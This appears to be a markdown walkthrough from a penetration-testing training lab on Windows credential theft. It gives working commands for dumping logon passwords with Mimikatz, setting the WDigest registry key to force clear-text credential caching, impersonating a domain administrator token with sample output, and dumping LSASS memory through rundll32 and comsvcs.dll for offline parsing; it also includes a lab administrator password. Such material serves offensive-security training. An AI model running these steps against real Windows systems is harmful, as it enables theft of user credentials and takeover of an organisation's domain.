# Credential Grabbing
> remoted into the client as...someone local/domain? Admin?
> 
1. Powershell:
`cd c:\Users\Public\Desktop\LAB_FILES\assets`
1. `expand-archive mimikatz_trunk.zip`
1. Run mimikatz meow.
   1. `cd .\mimikatz_trunk\x64\`
   1. `.\mimikatz.exe`
   
   1. In Mimikatz terminal @ `mimikatz #`:
   
        ```
        privilege::debug
        log m.txt
        sekurlsa::logonpasswords
        sekurlsa::wdigest
        ```

1. Launch a separate PowerShell window as admin and run:

    ```powershell    
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
    runas /user:wheel\Administrator notepad.exe
    password: 12qwaszx!@QWASZX
    ```

    - Minimize the `notepad` process window. **DO NOT close this window**
    - We're using RunAs to emulate a process being run via the `wheel\administrator` account.
    
1. Back in mimikatz:
   1. `sekurlsa::logonpasswords`
   1. `sekurlsa::wdigest`

>Yay clear text pw!

8. Elevate

`mimkatz # token::elevate /domainadmin`

    - Expected output:
        ```
        mimikatz # token::elevate /domainadmin
        Token Id  : 0
        User name :
        SID name  : WHEEL\Domain Admins

        3804    {0;00e652ef} 3 D 15095083       WHEEL\Administrator     S-1-5-21-2920872554-2728211966-3144411165-500   (16g,24p)       Primary
         -> Impersonated !
         * Process Token : {0;006de2b6} 3 D 15016662    CLIENT01\Administrator  S-1-5-21-1871320352-3388450030-3539921296-500   (14g,24p)       Primary
         * Thread Token  : {0;00e652ef} 3 D 15181987    WHEEL\Administrator     S-1-5-21-2920872554-2728211966-3144411165-500   (16g,24p)       Impersonation (Delegation)\
        ```

**CONGRATS!! You are not elevated to a domain admin account!



## Other way lolbins
1. in an local admin powershell:
```
get-process lsass

rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump <pid> C:\Windows\temp\mini.dump full
```

2. In mimikatz (this can be done "offline")
```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full

```





